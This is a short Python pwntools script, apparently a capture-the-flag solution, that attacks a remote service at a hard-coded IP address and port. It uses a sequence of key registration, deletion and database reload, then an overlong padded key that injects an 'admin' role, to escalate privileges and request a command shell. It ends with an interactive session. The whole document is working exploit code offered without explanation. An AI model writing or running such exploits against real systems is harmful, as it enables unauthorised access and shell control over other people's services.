from pwn import *

def register_native_key(user_name="a", user_type="a", some_string=b"a;"):
    command = f"REKE {user_name}:{user_type} ".encode() + some_string
    io.sendline(command)
    print(io.recv())

def delete_key(key = 1):
        io.sendline(f"DEKE {key}".encode())
        print(io.recv())

def reload_db():
        io.sendline(b"RLDB")
        print(io.recv())

def auth(id = 1):
        io.sendline(f"AUTH {id}".encode())
        print(io.recv())

def askForShell():
        io.sendline(b"EXEC")
        print(io.recv())

io = remote("94.237.63.109",31665)
io.timeout = 1
sleep(1)
register_native_key(user_name="a", user_type="admin", some_string=b"a;")

sleep(1)
register_native_key(user_name="b", user_type="b", some_string=b"b;")

sleep(1)
delete_key(2)

sleep(1)
reload_db()
sleep(1)
register_native_key(some_string=b"w" * 92 + b"a:admin a;")

sleep(1)
auth(1) 

sleep(1)
askForShell()

io.interactive()
